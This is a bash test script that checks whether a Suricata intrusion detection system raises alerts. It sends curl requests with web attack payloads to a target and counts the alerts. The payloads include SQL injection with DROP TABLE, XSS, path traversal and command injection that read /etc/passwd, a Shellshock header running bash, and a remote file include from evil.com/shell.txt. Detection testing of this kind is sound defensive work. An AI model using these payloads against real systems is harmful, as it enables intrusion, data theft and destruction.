#!/bin/bash
# NIDS Web 攻击检测测试
# 用法: ./test_web_attacks.sh <target_url>

set -e

TARGET="${1:-http://127.0.0.1}"
LOG_DIR="${2:-/var/log/suricata}"

echo "=================================================="
echo "  NIDS Web Attack Detection Tests"
echo "=================================================="
echo "Target: $TARGET"
echo "Log Dir: $LOG_DIR"
echo ""

# 检查 curl 是否安装
if ! command -v curl &> /dev/null; then
    echo "Error: curl is not installed"
    echo "Install with: sudo apt-get install -y curl"
    exit 1
fi

# 检查 Suricata 规则
RULES_DIR="/var/lib/suricata/rules"
RULES_COUNT=$(ls -1 "$RULES_DIR"/*.rules 2>/dev/null | wc -l)
if [ "$RULES_COUNT" -eq 0 ]; then
    echo "WARNING: No Suricata rules found in $RULES_DIR"
    echo "Run 'make download-rules' to download ET Open rules"
    echo "Tests will run but may not generate alerts"
    echo ""
fi

# 记录初始告警数（基线）
BASELINE_ALERTS=0
if [ -f "$LOG_DIR/eve.json" ]; then
    BASELINE_ALERTS=$(grep -c '"event_type":"alert"' "$LOG_DIR/eve.json" 2>/dev/null | tr -d '\n' || echo "0")
    BASELINE_ALERTS=${BASELINE_ALERTS:-0}
    INITIAL_ALERTS=$BASELINE_ALERTS
else
    INITIAL_ALERTS=0
fi
echo "Initial alerts: $INITIAL_ALERTS"
echo ""

send_request() {
    local name="$1"
    local url="$2"
    local extra_args="${3:-}"
    
    echo ">>> $name"
    echo "URL: $url"
    
    if [ -n "$extra_args" ]; then
        curl -s -o /dev/null --max-time 5 $extra_args "$url" 2>/dev/null || true
    else
        curl -s -o /dev/null --max-time 5 "$url" 2>/dev/null || true
    fi
    
    sleep 1
    
    if [ -f "$LOG_DIR/eve.json" ]; then
        CURRENT_ALERTS=$(grep -c '"event_type":"alert"' "$LOG_DIR/eve.json" 2>/dev/null | tr -d '\n' || echo "0")
        CURRENT_ALERTS=${CURRENT_ALERTS:-0}
        NEW_ALERTS=$((CURRENT_ALERTS - INITIAL_ALERTS))
        echo "New alerts: $NEW_ALERTS"
        INITIAL_ALERTS=$CURRENT_ALERTS
    fi
    echo ""
}

echo "=== 1. SQL Injection Tests ==="
send_request "Basic SQL Injection" "$TARGET/?id=1'%20OR%20'1'='1"
send_request "SQL DROP TABLE" "$TARGET/?id=1;%20DROP%20TABLE%20users--"
send_request "SQL UNION SELECT" "$TARGET/?id=1%20UNION%20SELECT%20*%20FROM%20users"
send_request "SQL Comment Bypass" "$TARGET/?id=admin'--"
send_request "SQL Boolean-based" "$TARGET/?id=1'%20AND%20'1'='1"

echo "=== 2. XSS Attack Tests ==="
send_request "XSS Script Tag" "$TARGET/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
send_request "XSS IMG Tag" "$TARGET/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
send_request "XSS SVG Tag" "$TARGET/search?q=%3Csvg%20onload=alert(1)%3E"
send_request "XSS Event Handler" "$TARGET/search?q=%3Cbody%20onload=alert(1)%3E"

echo "=== 3. Directory Traversal Tests ==="
send_request "Basic Traversal" "$TARGET/file?name=../../../etc/passwd"
send_request "Double Encoding" "$TARGET/file?name=....//....//etc/passwd"
send_request "URL Encoded" "$TARGET/file?name=..%2f..%2f..%2fetc/passwd"
send_request "Null Byte" "$TARGET/file?name=../../../etc/passwd%00.jpg"

echo "=== 4. Command Injection Tests ==="
send_request "Semicolon Injection" "$TARGET/exec?cmd=;cat%20/etc/passwd"
send_request "Pipe Injection" "$TARGET/exec?cmd=|id"
send_request "Backtick Injection" "$TARGET/exec?cmd=\`whoami\`"
send_request "Dollar Injection" "$TARGET/exec?cmd=\$(id)"

echo "=== 5. Shellshock Tests ==="
send_request "Shellshock CVE-2014-6271" "$TARGET/cgi-bin/test.cgi" "-H 'User-Agent: () { :; }; /bin/bash -c \"cat /etc/passwd\"'"
send_request "Shellshock Variant" "$TARGET/cgi-bin/test.cgi" "-H 'Referer: () { :;}; echo vulnerable'"

echo "=== 6. Malicious User-Agent Tests ==="
send_request "SQLMap UA" "$TARGET/" "-A 'sqlmap/1.4.7#stable'"
send_request "Nikto UA" "$TARGET/" "-A 'Nikto/2.1.6'"
send_request "Nessus UA" "$TARGET/" "-A 'Nessus SOAP v0.0.1'"
send_request "DirBuster UA" "$TARGET/" "-A 'DirBuster-0.12'"

echo "=== 7. LFI/RFI Tests ==="
send_request "Local File Inclusion" "$TARGET/page.php?file=/etc/passwd"
send_request "Remote File Inclusion" "$TARGET/page.php?file=http://evil.com/shell.txt"
send_request "PHP Wrapper" "$TARGET/page.php?file=php://filter/convert.base64-encode/resource=config.php"

# 最终统计
echo "=================================================="
echo "  Test Summary"
echo "=================================================="

TOTAL_NEW_ALERTS=0
if [ -f "$LOG_DIR/eve.json" ]; then
    FINAL_ALERTS=$(grep -c '"event_type":"alert"' "$LOG_DIR/eve.json" 2>/dev/null | tr -d '\n' || echo "0")
    FINAL_ALERTS=${FINAL_ALERTS:-0}
    TOTAL_NEW_ALERTS=$((FINAL_ALERTS - BASELINE_ALERTS))
    echo "Total alerts in eve.json: $FINAL_ALERTS"
    echo "New alerts from this test: $TOTAL_NEW_ALERTS"

    echo ""
    echo "Recent web attack alerts:"
    tail -100 "$LOG_DIR/eve.json" 2>/dev/null | grep '"event_type":"alert"' | \
        grep -iE 'sql|xss|traversal|injection|shellshock' | tail -5 | \
        python3 -c "import sys,json; [print(f\"  - {json.loads(l).get('alert',{}).get('signature','N/A')}\") for l in sys.stdin]" 2>/dev/null || echo "  (none or error reading)"
else
    echo "eve.json not found at $LOG_DIR/eve.json"
fi
echo "=================================================="

# 验证测试结果
if [ "$RULES_COUNT" -eq 0 ]; then
    echo ""
    echo "RESULT: SKIP (no rules loaded)"
    exit 0
elif [ "$TOTAL_NEW_ALERTS" -eq 0 ]; then
    echo ""
    echo "RESULT: WARN (no alerts generated - check if Suricata is monitoring the right interface)"
    exit 0
else
    echo ""
    echo "RESULT: PASS ($TOTAL_NEW_ALERTS alerts detected)"
    exit 0
fi
